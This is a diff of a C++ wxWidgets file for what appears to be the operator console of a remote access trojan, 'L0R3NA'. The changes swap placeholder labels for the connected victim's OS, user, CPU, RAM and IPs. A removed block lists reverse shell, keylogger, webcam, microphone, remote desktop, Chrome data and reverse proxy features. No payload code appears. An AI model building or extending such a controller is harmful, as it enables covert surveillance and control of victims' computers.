@@ -22,24 +22,14 @@ extern std::mutex vector_mutex;
 wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
     EVT_CLOSE(FrameCliente::OnClose)
     EVT_BUTTON(wxID_ANY, FrameCliente::OnButton)
-    /*EVT_BUTTON(EnumFrameIDS::BTN_Keylogger, FrameCliente::OnButton)
-    EVT_BUTTON(EnumFrameIDS::BTN_Adm_Ventanas, FrameCliente::OnButton)
-    EVT_BUTTON(EnumFrameIDS::BTN_Adm_Procesos, FrameCliente::OnButton)
-    EVT_BUTTON(EnumFrameIDS::BTN_Informacion, FrameCliente::OnButton)
-    EVT_BUTTON(EnumFrameIDS::BTN_Escaner, FrameCliente::OnButton)
-    EVT_BUTTON(EnumFrameIDS::BTN_Remote_Desktop, FrameCliente::OnButton)
-    EVT_BUTTON(EnumFrameIDS::BTN_Proxy_Iniciar, FrameCliente::OnButton)
-    EVT_BUTTON(EnumFrameIDS::BTN_Proxy_Detener, FrameCliente::OnButton)
-    EVT_BUTTON(EnumFrameIDS::BTN_Limpiar_Log, FrameCliente::OnButton)
-    EVT_BUTTON(EnumFrameIDS::BTN_Limpiar_Log, FrameCliente::OnButton)
-    */EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
+    EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
 wxEND_EVENT_TABLE()
 
 wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
     EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
 wxEND_EVENT_TABLE()
 
-FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _strIP)
+FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, struct Cliente& _cliente)
     :wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, _strID, wxDefaultPosition, wxSize(WIN_WIDTH, WIN_HEIGHT), wxDEFAULT_FRAME_STYLE & ~(wxRESIZE_BORDER | wxMAXIMIZE_BOX)) {
     
     wxString strTitle = "[";
@@ -57,7 +47,7 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _s
 
     //pnl_AdminArchivos->SetBackgroundColour(wxColour(100, 100, 100));
     
-    box_admin->Add(new panelFileManager(pnl_AdminArchivos, this->sckCliente, _strID, _strIP), 0, wxALL | wxEXPAND);
+    box_admin->Add(new panelFileManager(pnl_AdminArchivos, this->sckCliente, _strID, _cliente._strIp), 0, wxALL | wxEXPAND);
     
     pnl_AdminArchivos->SetSizer(box_admin);
     //////////////////////////////////////////////////
@@ -125,21 +115,14 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _s
     //////////////////////////////////////////////////
 
 
-
     //////////////////////////////////////////////////
     //proxy inversa
     //////////////////////////////////////////////////
     wxPanel* pnl_Proxy = new wxPanel(this, wxID_ANY, wxDefaultPosition);
     wxStaticBoxSizer* box_proxy = new wxStaticBoxSizer(wxVERTICAL, pnl_Proxy, "Proxy Inversa");
-
     //pnl_Proxy->SetBackgroundColour(wxColour(150, 150, 150));
 
     box_proxy->Add(new panelReverseProxy(pnl_Proxy, this->sckCliente), 1, wxALL | wxEXPAND);
-
-    /*box_proxy->Add(new wxStaticText(pnl_Proxy, wxID_ANY, "Puerto local"), 0, wxALL | wxEXPAND);
-    box_proxy->Add(new wxTextCtrl(pnl_Proxy, wxID_ANY, "8080"), 0, wxALL | wxEXPAND);
-    box_proxy->Add(new wxButton(pnl_Proxy, EnumFrameIDS::BTN_Proxy_Iniciar, "Iniciar"), 0, wxALL | wxEXPAND);
-    box_proxy->Add(new wxButton(pnl_Proxy, EnumFrameIDS::BTN_Proxy_Detener, "Detener"), 0, wxALL | wxEXPAND);*/
 
     pnl_Proxy->SetSizer(box_proxy);
     //////////////////////////////////////////////////
@@ -152,7 +135,14 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _s
     wxPanel* pnl_maquina = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(180, wxDefaultSize.GetHeight()));
     wxStaticBoxSizer* maquina_sizer = new wxStaticBoxSizer(wxVERTICAL, pnl_maquina, "Maquina");
 
-    wxImage imgCPU("./intel.png", wxBITMAP_TYPE_PNG);
+    std::string strPath = "";
+    if (_cliente._strCpu.find("ntel", 0) != std::string::npos) {
+        strPath = "./imgs/intel.png";
+    } else {
+        strPath = "./imgs/amd.png";
+    }
+
+    wxImage imgCPU(strPath, wxBITMAP_TYPE_PNG);
     wxBitmap bmpCPU;
     if (imgCPU.IsOk()) {
         imgCPU.Rescale(64, 64, wxIMAGE_QUALITY_HIGH);
@@ -167,27 +157,30 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _s
     wxFont font2(7, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_SEMIBOLD);
 
 
-    wxStaticText* lblOS = new wxStaticText(pnl_maquina, wxID_ANY, "Windows", wxDefaultPosition, wxDefaultSize);
+    wxStaticText* lblOS = new wxStaticText(pnl_maquina, wxID_ANY, _cliente._strSo, wxDefaultPosition, wxDefaultSize);
     lblOS->SetFont(font);
 
-    wxStaticText* lblUser = new wxStaticText(pnl_maquina, wxID_ANY, "eW1n", wxDefaultPosition, wxDefaultSize);
+    wxStaticText* lblUser = new wxStaticText(pnl_maquina, wxID_ANY, strSplit(_cliente._strUser, "@", 1)[0], wxDefaultPosition, wxDefaultSize);
     lblUser->SetFont(font);
 
 
-    wxStaticText* lblCPU = new wxStaticText(pnl_maquina, wxID_ANY, "Intel Tanuki", wxDefaultPosition, wxDefaultSize);
+    wxStaticText* lblCPU = new wxStaticText(pnl_maquina, wxID_ANY, _cliente._strCpu, wxDefaultPosition, wxDefaultSize);
     lblCPU->SetFont(font);
 
-    wxStaticText* lblRam = new wxStaticText(pnl_maquina, wxID_ANY, "8 GB", wxDefaultPosition, wxDefaultSize);
+    wxString strRAM = _cliente._strRAM;
+    strRAM += " MB";
+    wxStaticText* lblRam = new wxStaticText(pnl_maquina, wxID_ANY, strRAM, wxDefaultPosition, wxDefaultSize);
     lblRam->SetFont(font);
 
-    wxStaticText* lblIPlocal = new wxStaticText(pnl_maquina, wxID_ANY, "192.168.0.2", wxDefaultPosition, wxDefaultSize);
-    lblIPlocal->SetFont(font);
+    wxArrayString ips_array;
+    for (std::string _vcip : strSplit(_cliente._strIPS, ":[<->]:", 100)) {
+        ips_array.push_back(_vcip);
+    }
+    this->cmdIPS = new wxComboBox(pnl_maquina, wxID_ANY, wxEmptyString, wxDefaultPosition, wxDefaultSize, ips_array, wxCB_READONLY);
+    this->cmdIPS->SetFont(font);
 
-    wxStaticText* lblIPExterna = new wxStaticText(pnl_maquina, wxID_ANY, "172.92.65.88", wxDefaultPosition, wxDefaultSize);
+    wxStaticText* lblIPExterna = new wxStaticText(pnl_maquina, wxID_ANY, _cliente._strIp, wxDefaultPosition, wxDefaultSize);
     lblIPExterna->SetFont(font);
-
-    this->lblestado = new wxStaticText(pnl_maquina, wxID_ANY, wxEmptyString, wxDefaultPosition, wxDefaultSize);
-    this->lblestado->SetFont(font);
 
     wxStaticText* _lblOS = new wxStaticText(pnl_maquina, wxID_ANY, "OS:", wxDefaultPosition, wxDefaultSize);
     _lblOS->SetFont(font2);
@@ -207,11 +200,6 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _s
     wxStaticText* _lblIPExterna = new wxStaticText(pnl_maquina, wxID_ANY, "IP Externa:", wxDefaultPosition, wxDefaultSize);
     _lblIPExterna->SetFont(font2);
 
-    wxStaticText* _lblestado = new wxStaticText(pnl_maquina, wxID_ANY, "Estado:", wxDefaultPosition, wxDefaultSize);
-    _lblestado->SetFont(font2);
-
-    this->m_SetEstado("Conectado");
-
     lblGrid->Add(_lblOS, 0);
     lblGrid->Add(lblOS, 1, wxALL | wxEXPAND);
 
@@ -225,13 +213,10 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _s
     lblGrid->Add(lblRam, 1, wxALL | wxEXPAND);
 
     lblGrid->Add(_lblIPlocal, 0);
-    lblGrid->Add(lblIPlocal, 1, wxALL | wxEXPAND);
+    lblGrid->Add(this->cmdIPS, 1, wxALL | wxEXPAND);
 
     lblGrid->Add(_lblIPExterna, 0);
     lblGrid->Add(lblIPExterna, 1, wxALL | wxEXPAND);
-
-    lblGrid->Add(_lblestado, 0);
-    lblGrid->Add(lblestado, 1, wxALL | wxEXPAND);
 
     maquina_sizer->Add(bmp, 0, wxALIGN_CENTER);
     maquina_sizer->Add(lblGrid, 0, wxALL | wxEXPAND);
@@ -287,101 +272,98 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _s
 }
 
 
-FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
-    : wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, ":v", wxDefaultPosition, wxDefaultSize, wxDEFAULT_FRAME_STYLE, strID.substr(0, strID.find('/'))) {
+//FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
+//    : wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, ":v", wxDefaultPosition, wxDefaultSize, wxDEFAULT_FRAME_STYLE, strID.substr(0, strID.find('/'))) {
+//
+//    SetTransparent(245);
+//
+//    this->sckCliente = sckID;
+//    int npos = strID.find('/', 0);
+//    this->strClienteID = strID.substr(0, npos);
+//    //this->strIP = strIP;
+//
+//    wxString strTitle = "[";
+//    strTitle.append(strID.c_str());
+//    strTitle.append("] - Admin");
+//    this->SetTitle(strTitle);
+//    
+//    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
+//    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
+//    
+//    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450), this->strClienteID, strIP, sckID);
+//    
+//    wxTreeItemId rootC           = this->m_tree->AddRoot(                    wxT("CLI"));
+//    wxTreeItemId rootAdmin       = this->m_tree->AppendItem(rootC,       wxT("[Admin]"));
+//    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC,         wxT("[Spy]"));
+//    wxTreeItemId rootInformation = this->m_tree->AppendItem(rootC, wxT("[Informacion]"));
+//    wxTreeItemId rootNetwork     = this->m_tree->AppendItem(rootC,         wxT("[Red]"));
+//    wxTreeItemId rootMisc        = this->m_tree->AppendItem(rootC,        wxT("[Misc]"));
+//
+//    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
+//    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Procesos"));
+//    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Ventanas"));
+//    this->m_tree->AppendItem(rootAdmin,     wxT("Reverse Shell"));
+//    this->m_tree->AppendItem(rootAdmin,    wxT("Transferencias"));
+//
+//    //this->m_tree->AppendItem(rootAdmin, wxT("Persistencia"));
+//
+//    this->m_tree->AppendItem(rootSurveilance,         wxT("Keylogger"));
+//    this->m_tree->AppendItem(rootSurveilance,            wxT("Camara"));
+//    this->m_tree->AppendItem(rootSurveilance,         wxT("Microfono"));
+//    this->m_tree->AppendItem(rootSurveilance, wxT("Escritorio Remoto"));
+//
+//    this->m_tree->AppendItem(rootInformation, wxT("Usuarios"));
+//    wxTreeItemId rootBrowsers = this->m_tree->AppendItem(rootInformation, wxT("Navegadores"));
+//    this->m_tree->AppendItem(rootBrowsers, wxT("Chrome"));
+//
+//    this->m_tree->AppendItem(rootNetwork, wxT("Proxy Inversa"));
+//    this->m_tree->AppendItem(rootNetwork, wxT("Escaner de Red"));
+//
+//    this->m_tree->AppendItem(rootMisc, wxT("Diversion"));
+//
+//    //Sizer para hacer el treeview dinamico al hacer resize
+//    wxBoxSizer* pnl_left_Sizer = new wxBoxSizer(wxHORIZONTAL);
+//    pnl_left_Sizer->Add(this->m_tree, 1, wxEXPAND | wxALL, 2);
+//    pnl_Left->SetSizer(pnl_left_Sizer);
+//    //----------------------------------------------
+//
+//    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxDefaultSize,
+//        wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);
+//
+//    //Sizer para el notebook del lado derecho
+//    wxBoxSizer* pnl_right_Sizer = new wxBoxSizer(wxHORIZONTAL);
+//    pnl_right_Sizer->Add(this->m_tree->p_Notebook, 1, wxEXPAND | wxALL, 2);
+//    pnl_Right->SetSizer(pnl_right_Sizer);
+//    //----------------------------------------------
+//
+//    wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
+//    wxString htmlsource = "<center><h2>L0R3NA v0.1</h2><br>#Honduras</center>";
+//    html->SetPage(htmlsource);
+//    html->SetSize(wxSize(200, 200));
+//
+//    this->m_tree->p_Notebook->Freeze();
+//    this->m_tree->p_Notebook->AddPage(html, ":v", true);
+//    this->m_tree->p_Notebook->Thaw();
+//    
+//    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
+//
+//    sizer->Add(pnl_Left, 0, wxEXPAND | wxALL, 2);
+//    sizer->Add(pnl_Right, 1, wxEXPAND | wxALL, 2);
+//    
+//    this->SetSizerAndFit(sizer);
+//
+//    SetClientSize(700, 450);
+//
+//
+//#ifdef DEBUG_DESIGN_LIMITS
+//    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo
+//    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));
+//    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
+//    html->SetBackgroundColour(wxColor(0, 0, 255));
+//#endif
+//    
+//}
 
-    SetTransparent(245);
-
-    this->sckCliente = sckID;
-    int npos = strID.find('/', 0);
-    this->strClienteID = strID.substr(0, npos);
-    //this->strIP = strIP;
-
-    wxString strTitle = "[";
-    strTitle.append(strID.c_str());
-    strTitle.append("] - Admin");
-    this->SetTitle(strTitle);
-    
-    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
-    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
-    
-    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450), this->strClienteID, strIP, sckID);
-    
-    wxTreeItemId rootC           = this->m_tree->AddRoot(                    wxT("CLI"));
-    wxTreeItemId rootAdmin       = this->m_tree->AppendItem(rootC,       wxT("[Admin]"));
-    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC,         wxT("[Spy]"));
-    wxTreeItemId rootInformation = this->m_tree->AppendItem(rootC, wxT("[Informacion]"));
-    wxTreeItemId rootNetwork     = this->m_tree->AppendItem(rootC,         wxT("[Red]"));
-    wxTreeItemId rootMisc        = this->m_tree->AppendItem(rootC,        wxT("[Misc]"));
-
-    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
-    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Procesos"));
-    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Ventanas"));
-    this->m_tree->AppendItem(rootAdmin,     wxT("Reverse Shell"));
-    this->m_tree->AppendItem(rootAdmin,    wxT("Transferencias"));
-
-    //this->m_tree->AppendItem(rootAdmin, wxT("Persistencia"));
-
-    this->m_tree->AppendItem(rootSurveilance,         wxT("Keylogger"));
-    this->m_tree->AppendItem(rootSurveilance,            wxT("Camara"));
-    this->m_tree->AppendItem(rootSurveilance,         wxT("Microfono"));
-    this->m_tree->AppendItem(rootSurveilance, wxT("Escritorio Remoto"));
-
-    this->m_tree->AppendItem(rootInformation, wxT("Usuarios"));
-    wxTreeItemId rootBrowsers = this->m_tree->AppendItem(rootInformation, wxT("Navegadores"));
-    this->m_tree->AppendItem(rootBrowsers, wxT("Chrome"));
-
-    this->m_tree->AppendItem(rootNetwork, wxT("Proxy Inversa"));
-    this->m_tree->AppendItem(rootNetwork, wxT("Escaner de Red"));
-
-    this->m_tree->AppendItem(rootMisc, wxT("Diversion"));
-
-    //Sizer para hacer el treeview dinamico al hacer resize
-    wxBoxSizer* pnl_left_Sizer = new wxBoxSizer(wxHORIZONTAL);
-    pnl_left_Sizer->Add(this->m_tree, 1, wxEXPAND | wxALL, 2);
-    pnl_Left->SetSizer(pnl_left_Sizer);
-    //----------------------------------------------
-
-    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxDefaultSize,
-        wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);
-
-    //Sizer para el notebook del lado derecho
-    wxBoxSizer* pnl_right_Sizer = new wxBoxSizer(wxHORIZONTAL);
-    pnl_right_Sizer->Add(this->m_tree->p_Notebook, 1, wxEXPAND | wxALL, 2);
-    pnl_Right->SetSizer(pnl_right_Sizer);
-    //----------------------------------------------
-
-    wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
-    wxString htmlsource = "<center><h2>L0R3NA v0.1</h2><br>#Honduras</center>";
-    html->SetPage(htmlsource);
-    html->SetSize(wxSize(200, 200));
-
-    this->m_tree->p_Notebook->Freeze();
-    this->m_tree->p_Notebook->AddPage(html, ":v", true);
-    this->m_tree->p_Notebook->Thaw();
-    
-    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
-
-    sizer->Add(pnl_Left, 0, wxEXPAND | wxALL, 2);
-    sizer->Add(pnl_Right, 1, wxEXPAND | wxALL, 2);
-    
-    this->SetSizerAndFit(sizer);
-
-    SetClientSize(700, 450);
-
-
-#ifdef DEBUG_DESIGN_LIMITS
-    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo
-    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));
-    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
-    html->SetBackgroundColour(wxColor(0, 0, 255));
-#endif
-    
-}
-
-void FrameCliente::m_SetEstado(const wxString _str) {
-    this->lblestado->SetLabelText(_str);
-}
 
 void FrameCliente::m_AddRemoteLog(const char* _buffer) {
     wxString strTemp(_buffer);
